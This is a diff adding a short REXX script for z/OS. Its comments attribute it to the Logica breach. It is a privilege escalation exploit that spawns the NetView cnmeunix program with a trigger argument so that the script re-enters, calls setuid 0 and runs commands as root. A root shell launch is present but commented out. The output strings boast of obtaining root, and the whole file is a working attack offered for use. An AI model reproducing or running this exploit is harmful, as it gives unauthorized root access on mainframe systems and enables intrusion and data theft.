@@ -1,0 +1,25 @@
+/* REXX */
+/* from fup.pdf */
+/* Original file from Logica breach fixed by SoF */
+
+call syscalls 'ON'
+address syscall
+if __argv.2=='kuku' then do
+    say '[>] 0bt41n3d r00t!$#'
+    address syscall 'setuid 0'
+    address sh 'id'
+    /* address sh '/bin/sh' */
+    exit
+end
+say '[+] current UID/GID'
+address sh 'id'
+say '[+] l3tz g3t s0m3 0f d4t r00t!@#'
+parm.0=2
+parm.1=__argv.1
+parm.2='kuku'
+env.0=1
+env.1='_BPC_SHAREAS=NO'
+say '[+] spawning'
+/* Check the version folder here for your OS */
+'spawn /usr/lpp/netview/v5r1/bin/cnmeunix 0 . parm. env.'
+address syscall 'wait wret.'
